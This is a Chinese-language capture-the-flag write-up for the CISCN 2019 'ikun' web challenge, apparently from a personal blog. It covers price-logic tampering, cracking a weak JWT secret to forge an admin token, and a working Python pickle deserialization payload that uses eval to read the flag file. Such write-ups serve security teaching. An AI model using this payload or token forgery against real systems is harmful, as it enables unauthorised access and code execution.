---
title: "CISCN 2019 华北赛区 Day1 Web2 ikun"
slug: ciscn2019-day1-web2-ikun
url: /2019/ciscn2019-day1-web2-ikun.html
date: 2019-10-17 12:50:05
categories: ["CTF"]
tags: ["CTF", "CISCN 2019", "WriteUp", "JWT", "Python", "反序列化漏洞"]
toc: true
draft: false
---

地址：[https://buuoj.cn](https://buuoj.cn/)

考点：

* 逻辑漏洞
* JWT
* 未授权访问
* python 反序列化

![ikun-1](https://oss.zjun.info/zjun.info/ikun-1.webp)

看到主页，一定要买到 lv6

![ikun-2](https://oss.zjun.info/zjun.info/ikun-2.webp)

![ikun-3](https://oss.zjun.info/zjun.info/ikun-3.webp)

很多还有下一页，点击下一页后发现 url 的改变

```bash
http://4cf0b42f-4999-42cb-8ea4-8be1be09e6ad.node3.buuoj.cn/shop?page=2
```

于是测试了一下，总共有 500 页，写了个简单的脚本寻找 lv6

```python
from time import sleep
import requests
url="http://4cf0b42f-4999-42cb-8ea4-8be1be09e6ad.node3.buuoj.cn/shop?page="
for i in range(0,500):
    r=requests.get(url+str(i))
    sleep(0.4)
    if 'lv6.png' in r.text:
        print(i)
        break
```

最开始没写 sleep，被封了 IP，挂个代理跑了两分钟结果为 181

![ikun-4](https://oss.zjun.info/zjun.info/ikun-4.webp)

创建了一个账号，查看余额，远远不够买 lv6

![ikun-5](https://oss.zjun.info/zjun.info/ikun-5.webp)

burp 抓个包看看

![ikun-6](https://oss.zjun.info/zjun.info/ikun-6.webp)

有价格，折扣，改了价格会显示操作失败，于是改了折扣

![ikun-7](https://oss.zjun.info/zjun.info/ikun-7.webp)

是一个重定向，浏览器如下显示，并有了后台地址 `/b1g_m4mber` 但是需要权限

![ikun-8](https://oss.zjun.info/zjun.info/ikun-8.webp)

抓的包里还看到了 JWT，拿去[解码](http://jwt.calebb.net/)

![ikun-9](https://oss.zjun.info/zjun.info/ikun-9.webp)

正是刚才注册的 id，就想着这里能不能未授权登陆管理员账号。
[爆破](https://github.com/brendan-rius/c-jwt-cracker)出 JWT 的 key 为 1kun

![ikun-10](https://oss.zjun.info/zjun.info/ikun-10.webp)

管理员的 JWT，修改 jwt 字段往服务器发包

![ikun-11](https://oss.zjun.info/zjun.info/ikun-11.webp)

![ikun-12](https://oss.zjun.info/zjun.info/ikun-12.webp)

成功以管理员登陆

![ikun-13](https://oss.zjun.info/zjun.info/ikun-13.webp)

先看了看管理员身份的个人中心

![ikun-14](https://oss.zjun.info/zjun.info/ikun-14.webp)

一眼看出是 unicode 编码，本以为就要结束了，结果

![ikun-15](https://oss.zjun.info/zjun.info/ikun-15.webp)

那就回到购买 lv6 页面，源码发现文件下载，分析。

![ikun-16](https://oss.zjun.info/zjun.info/ikun-16.webp)

admin.py 存在反序列化

![ikun-17](https://oss.zjun.info/zjun.info/ikun-17.png)

附上 exp

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
```

将生成的 payload 传给 become 传入服务器可成功回显 flag
